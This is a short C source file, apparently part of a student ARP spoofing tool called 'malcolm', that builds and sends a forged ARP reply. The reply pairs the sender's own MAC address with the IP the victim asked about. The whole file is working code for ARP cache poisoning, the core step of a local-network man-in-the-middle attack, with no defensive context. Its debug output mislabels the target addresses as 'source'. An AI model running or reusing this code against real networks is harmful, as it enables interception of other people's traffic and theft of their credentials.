#include "malcolm.h"

static void	display_addr(t_arp *arp)
{
	char		*mac;
	char		*ip;

	printf("Sending an ARP reply to the target address with spoofed source\n");
	mac = mac_strconv(arp->sender_mac);
	ip = ip_strconv(arp->sender_ip);
	printf("source mac address : %s\n"
			"source IP address : %s\n", mac, ip);
	ft_multifree(&mac, &ip, NULL);	
	mac = mac_strconv(arp->target_mac);
	ip = ip_strconv(arp->target_ip);
	printf("source mac address : %s\n"
			"source IP address : %s\n", mac, ip);
	ft_multifree(&mac, &ip, NULL);	
}

void	send_arp(t_malcolm *mal, t_arp *bef)
{
	ssize_t		ret;
	t_arp		*arp;
	char		buf[BUFSIZE];


	arp = (t_arp *)buf;
	arp->htype = htons(1);
	arp->ptype = htons(ETH_P_IP);
	arp->hlen = 6;
	arp->plen = 4;
	arp->opcode = htons(ARPOP_REPLY);
	set_mac_addr(mal->s_maddr, arp->sender_mac, 6);
	copy_bytes(arp->sender_ip, bef->target_ip, 4);
	copy_bytes(arp->target_mac, bef->sender_mac, 6);
	copy_bytes(arp->target_ip, bef->sender_ip, 4);
	display_addr(arp);
	ret = sendto(mal->sockfd, buf, sizeof(t_arp), 0, mal->d_addr, mal->d_addrlen);
	printf("Sent an ARP reply packet of %lu len\n", ret);
}
